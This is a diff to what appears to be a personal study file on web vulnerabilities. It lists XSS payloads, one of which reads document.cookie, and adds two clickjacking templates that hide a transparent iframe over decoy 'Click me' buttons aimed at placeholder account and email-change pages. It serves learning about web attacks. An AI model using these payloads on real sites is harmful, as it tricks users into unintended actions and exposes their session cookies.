@@ -46,6 +46,47 @@ Fucntionning :
     <a onmouseover="alert('youhou')"\>Click me!</a>
     <a href="https://github.com/fabienAstia/xss-vulnerabilities/tree/main">clickme</a>
     <a onclick=alert(document.cookie) href="#">Submit</a>
+    
+    Trying some Clickjacking :
+    <style>
+        iframe {
+        position:relative;
+        width: 500px;
+        height: 700px;
+        opacity: 0.1;
+        z-index: 2;
+        }
+        div {
+        position:absolute;
+        top:470px;
+        left:60px;
+        z-index: 1;
+        }
+        </style>
+        <div>Click me</div>
+        <iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
+
+    <style>
+        iframe {
+        position:relative;
+        width: 500px;
+        height: 500px;
+        opacity: 0.1;
+        z-index: 2;
+        }
+        .firstClick, .secondClick {
+        position:absolute;
+        top:330px;
+        left:60px;
+        z-index: 1;
+        }
+        .secondClick {
+        left:210px;
+        }
+        </style>
+        <div class="firstClick">Click me first</div>
+        <div class="secondClick">Click me next</div>
+        <iframe src="https://vulnerable.net/account"></iframe>
 
 
  Not Fucntionning:
